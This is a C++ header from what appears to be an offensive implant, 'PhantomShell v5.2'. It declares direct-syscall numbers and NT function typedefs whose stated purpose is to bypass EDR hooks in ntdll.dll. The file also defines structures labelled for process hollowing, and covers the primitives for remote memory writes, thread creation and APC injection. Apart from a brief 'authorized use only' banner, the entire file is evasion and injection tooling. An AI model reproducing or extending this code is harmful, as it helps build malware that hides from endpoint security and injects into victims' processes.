/*
 * PhantomShell v5.2 — NT API Declarations for Direct Syscalls
 * AUTHORIZED USE ONLY: This tool is for authorized security testing and research.
 * Unauthorized access to computer systems is illegal.
 *
 * Direct syscall stubs to bypass EDR userland hooks on ntdll.dll.
 * Syscall numbers are for Windows 10 20H2+ / Windows 11.
 */

#pragma once

#ifndef NTAPI_H
#define NTAPI_H

#include <windows.h>

// --------------------------------------------------------------------------
// NT status and types
// --------------------------------------------------------------------------
#ifndef NT_SUCCESS
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
#endif

typedef LONG NTSTATUS;
typedef NTSTATUS* PNTSTATUS;

typedef struct _UNICODE_STRING {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR  Buffer;
} UNICODE_STRING, *PUNICODE_STRING;

typedef struct _OBJECT_ATTRIBUTES {
    ULONG           Length;
    HANDLE          RootDirectory;
    PUNICODE_STRING ObjectName;
    ULONG           Attributes;
    PVOID           SecurityDescriptor;
    PVOID           SecurityQualityOfService;
} OBJECT_ATTRIBUTES, *POBJECT_ATTRIBUTES;

#define InitializeObjectAttributes(p, n, a, r, s) { \
    (p)->Length = sizeof(OBJECT_ATTRIBUTES);         \
    (p)->RootDirectory = r;                          \
    (p)->Attributes = a;                             \
    (p)->ObjectName = n;                             \
    (p)->SecurityDescriptor = s;                     \
    (p)->SecurityQualityOfService = NULL;             \
}

typedef struct _CLIENT_ID {
    HANDLE UniqueProcess;
    HANDLE UniqueThread;
} CLIENT_ID, *PCLIENT_ID;

typedef struct _PS_ATTRIBUTE {
    ULONG_PTR Attribute;
    SIZE_T    Size;
    union {
        ULONG_PTR Value;
        PVOID     ValuePtr;
    };
    PSIZE_T ReturnLength;
} PS_ATTRIBUTE, *PPS_ATTRIBUTE;

typedef struct _PS_ATTRIBUTE_LIST {
    SIZE_T       TotalLength;
    PS_ATTRIBUTE Attributes[1];
} PS_ATTRIBUTE_LIST, *PPS_ATTRIBUTE_LIST;

// --------------------------------------------------------------------------
// Syscall numbers — Windows 10 20H2+ / Windows 11 (x64)
// These vary across builds; update if targeting a specific version.
// --------------------------------------------------------------------------
namespace Syscall {
    // NtAllocateVirtualMemory — syscall 0x18
    constexpr DWORD NtAllocateVirtualMemory = 0x18;

    // NtWriteVirtualMemory — syscall 0x3A
    constexpr DWORD NtWriteVirtualMemory = 0x3A;

    // NtProtectVirtualMemory — syscall 0x50
    constexpr DWORD NtProtectVirtualMemory = 0x50;

    // NtReadVirtualMemory — syscall 0x3F
    constexpr DWORD NtReadVirtualMemory = 0x3F;

    // NtCreateThreadEx — syscall 0xC7
    constexpr DWORD NtCreateThreadEx = 0xC7;

    // NtOpenProcess — syscall 0x26
    constexpr DWORD NtOpenProcess = 0x26;

    // NtClose — syscall 0x0F
    constexpr DWORD NtClose = 0x0F;

    // NtUnmapViewOfSection — syscall 0x2A
    constexpr DWORD NtUnmapViewOfSection = 0x2A;

    // NtQueryInformationProcess — syscall 0x19
    constexpr DWORD NtQueryInformationProcess = 0x19;

    // NtResumeThread — syscall 0x52
    constexpr DWORD NtResumeThread = 0x52;

    // NtQueueApcThread — syscall 0x45
    constexpr DWORD NtQueueApcThread = 0x45;
}

// --------------------------------------------------------------------------
// NT function typedefs for dynamic resolution
// --------------------------------------------------------------------------
typedef NTSTATUS(NTAPI* pNtAllocateVirtualMemory)(
    HANDLE    ProcessHandle,
    PVOID*    BaseAddress,
    ULONG_PTR ZeroBits,
    PSIZE_T   RegionSize,
    ULONG     AllocationType,
    ULONG     Protect
);

typedef NTSTATUS(NTAPI* pNtWriteVirtualMemory)(
    HANDLE  ProcessHandle,
    PVOID   BaseAddress,
    PVOID   Buffer,
    SIZE_T  NumberOfBytesToWrite,
    PSIZE_T NumberOfBytesWritten
);

typedef NTSTATUS(NTAPI* pNtProtectVirtualMemory)(
    HANDLE  ProcessHandle,
    PVOID*  BaseAddress,
    PSIZE_T RegionSize,
    ULONG   NewProtect,
    PULONG  OldProtect
);

typedef NTSTATUS(NTAPI* pNtReadVirtualMemory)(
    HANDLE  ProcessHandle,
    PVOID   BaseAddress,
    PVOID   Buffer,
    SIZE_T  NumberOfBytesToRead,
    PSIZE_T NumberOfBytesRead
);

typedef NTSTATUS(NTAPI* pNtCreateThreadEx)(
    PHANDLE            ThreadHandle,
    ACCESS_MASK        DesiredAccess,
    POBJECT_ATTRIBUTES ObjectAttributes,
    HANDLE             ProcessHandle,
    PVOID              StartRoutine,
    PVOID              Argument,
    ULONG              CreateFlags,
    SIZE_T             ZeroBits,
    SIZE_T             StackSize,
    SIZE_T             MaximumStackSize,
    PPS_ATTRIBUTE_LIST AttributeList
);

typedef NTSTATUS(NTAPI* pNtOpenProcess)(
    PHANDLE            ProcessHandle,
    ACCESS_MASK        DesiredAccess,
    POBJECT_ATTRIBUTES ObjectAttributes,
    PCLIENT_ID         ClientId
);

typedef NTSTATUS(NTAPI* pNtClose)(
    HANDLE Handle
);

typedef NTSTATUS(NTAPI* pNtUnmapViewOfSection)(
    HANDLE ProcessHandle,
    PVOID  BaseAddress
);

typedef NTSTATUS(NTAPI* pNtQueryInformationProcess)(
    HANDLE           ProcessHandle,
    ULONG            ProcessInformationClass,
    PVOID            ProcessInformation,
    ULONG            ProcessInformationLength,
    PULONG           ReturnLength
);

typedef NTSTATUS(NTAPI* pNtResumeThread)(
    HANDLE ThreadHandle,
    PULONG PreviousSuspendCount
);

typedef NTSTATUS(NTAPI* pNtQueueApcThread)(
    HANDLE  ThreadHandle,
    PVOID   ApcRoutine,
    PVOID   ApcArgument1,
    PVOID   ApcArgument2,
    PVOID   ApcArgument3
);

// --------------------------------------------------------------------------
// Process information structures for process hollowing
// --------------------------------------------------------------------------
typedef struct _PEB_LDR_DATA_PARTIAL {
    BYTE Reserved[8];
    PVOID Reserved2[3];
} PEB_LDR_DATA_PARTIAL;

typedef struct _PEB_PARTIAL {
    BYTE                 Reserved1[2];
    BYTE                 BeingDebugged;
    BYTE                 Reserved2[1];
    PVOID                Reserved3[2];
    PEB_LDR_DATA_PARTIAL* Ldr;
    PVOID                ProcessParameters; // RTL_USER_PROCESS_PARAMETERS*
    BYTE                 Reserved4[104];
    PVOID                Reserved5[52];
    PVOID                PostProcessInitRoutine;
    BYTE                 Reserved6[128];
    PVOID                Reserved7[1];
    ULONG                SessionId;
} PEB_PARTIAL;

typedef struct _PROCESS_BASIC_INFORMATION {
    NTSTATUS ExitStatus;
    PEB_PARTIAL* PebBaseAddress;
    ULONG_PTR AffinityMask;
    LONG      BasePriority;
    HANDLE    UniqueProcessId;
    HANDLE    InheritedFromUniqueProcessId;
} PROCESS_BASIC_INFORMATION;

// ProcessBasicInformation class = 0
constexpr ULONG ProcessBasicInformation = 0;

// --------------------------------------------------------------------------
// Helper: resolve NT function from ntdll at runtime
// --------------------------------------------------------------------------
inline FARPROC ResolveNtFunction(const char* funcName) {
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) return nullptr;
    return GetProcAddress(hNtdll, funcName);
}

#endif // NTAPI_H
